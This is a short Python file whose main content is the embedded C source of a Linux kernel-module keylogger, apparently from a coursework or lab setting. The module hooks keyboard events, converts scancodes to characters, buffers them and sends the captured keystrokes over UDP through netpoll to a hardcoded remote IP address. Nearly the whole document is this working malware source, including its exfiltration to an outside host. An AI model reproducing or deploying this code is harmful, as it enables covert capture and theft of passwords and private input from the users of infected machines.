#!/usr/bin/python
from commands import getoutput



src = """#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/netpoll.h>
#include <asm/io.h>
#include <linux/keyboard.h>

#include "keylogger.h"

#define PROC_FILE_NAME "kl"
#define BUFFER_SIZE 32

static char kl_buffer[BUFFER_SIZE+1];
static int kl_buffer_offset = 0;
static struct file_operations proc_fops;
static struct netpoll *np = NULL;
static struct netpoll np_t;
static struct notifier_block nb;

// INADDR_LOCAL is the local ip address, since 127.0.0.1 wont work..
// you'll have to replace this with the hex of the ip for the computer you're adding this
// module to
#define INADDR_LOCAL ((unsigned long int)0x0A600634) // 10.96.6.43
#define INADDR_SEND ((unsigned long int)0x4A76164B) // 74.118.22.75 (isoptera.lcsc.edu)

static void send_msg(char *msg, size_t size)
{
		if(kl_buffer[0] != '\0') {
			netpoll_send_udp(np, msg, size);
//			printk(KERN_INFO "Successfully sent off: %s\n", msg);
		}
}

/*
 This function services keyboard interrupts.
*/
static void reset_buffer(void)
{
	send_msg(kl_buffer, kl_buffer_offset);
	kl_buffer_offset = 0;
	memset(kl_buffer, 0, BUFFER_SIZE);
}


static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) 
{
	int read_size;
	if(count > BUFFER_SIZE) {
		read_size = BUFFER_SIZE;
	} else {
		read_size = count;
	}

	copy_to_user(buf, kl_buffer, read_size);
	reset_buffer();
	return read_size;
}

static void setup_netpoll(void)
{
	np_t.name = "LRNG";
	strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
	np_t.local_ip.ip = htonl(INADDR_LOCAL);
	np_t.remote_ip.ip = htonl(INADDR_SEND);
	np_t.local_port = 5000;
	np_t.remote_port = 5135;
	memset(np_t.remote_mac, 0xff, ETH_ALEN);
	netpoll_setup(&np_t);
	np = &np_t;
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	//struct vc_data *vc = param->vc;
//	int ret = NOTIFY_OK;
	int scancode;
	int reslt;
	char c;
			  
	if (code == KBD_KEYCODE) {
		scancode = param->value;
//		printk(KERN_DEBUG "KEYLOGGER %x %s\n", param->value, (param->down ? "down" : "up"));
		if(!param->down) {
			scancode += 0x80;
		}

		reslt = handle_scancode(scancode, &c);
		if(reslt == NEW_CHAR) {
			if(kl_buffer_offset >= BUFFER_SIZE) {
				reset_buffer();
			}
			kl_buffer[kl_buffer_offset++] = c;
		}
	}
	return 0;
}

/*
 Initialize the module - register the IRQ handler
*/
static int __init init_keylogger(void)
{
	proc_fops.read = read_simple;
	nb.notifier_call = hello_notify;
	register_keyboard_notifier(&nb);
//	proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
	setup_netpoll();
//	send_msg("hi", 2);
	return 0;
}

static void __exit exit_keylogger(void)
{
	unregister_keyboard_notifier(&nb);
//	remove_proc_entry(PROC_FILE_NAME, NULL);
}

module_init(init_keylogger);
module_exit(exit_keylogger);
MODULE_LICENSE ("GPL");"""
